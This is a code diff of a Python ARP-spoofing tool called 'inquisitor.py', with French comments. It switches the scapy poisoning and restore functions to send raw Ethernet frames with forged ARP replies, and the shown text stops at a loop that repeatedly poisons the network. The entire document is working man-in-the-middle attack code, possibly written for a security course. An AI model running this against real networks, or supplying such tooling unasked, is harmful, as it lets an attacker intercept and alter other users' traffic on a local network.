@@ -1,27 +1,31 @@
 import time
 import sys
-from scapy.all import ARP, send
-
+from scapy.all import ARP, Ether, sendp
 
 def arp_poison(target_ip, target_mac, source_ip, source_mac):
+    # Créer un paquet Ethernet + ARP
+    ether = Ether(dst=target_mac, src=source_mac)
     arp_response = ARP(op=2, psrc=source_ip, pdst=target_ip, hwdst=target_mac, hwsrc=source_mac)
-    send(arp_response, verbose=False)
+    packet = ether/arp_response
+    sendp(packet, verbose=False)
 
 def restore_arp(target_ip, target_mac, source_ip, source_mac):
+    # Restaurer avec les bonnes adresses
+    ether = Ether(dst=target_mac, src=source_mac)
     arp_response = ARP(op=2, psrc=source_ip, pdst=target_ip, hwdst=target_mac, hwsrc=source_mac)
-    send(arp_response, count=5, verbose=False)
-
+    packet = ether/arp_response
+    sendp(packet, count=5, verbose=False)
 
 if __name__ == "__main__":
     if len(sys.argv) < 5:
         print("Usage: python3 inquisitor.py <IPsource> <MACsource> <IPtarget> <MACtarget>")
         sys.exit(1)
-
+        
     IPsource = sys.argv[1]
     MACsource = sys.argv[2]
     IPtarget = sys.argv[3]
     MACtarget = sys.argv[4]
-
+    
     try:
         print("Inquisitor is poisoning the network...")
         while True:
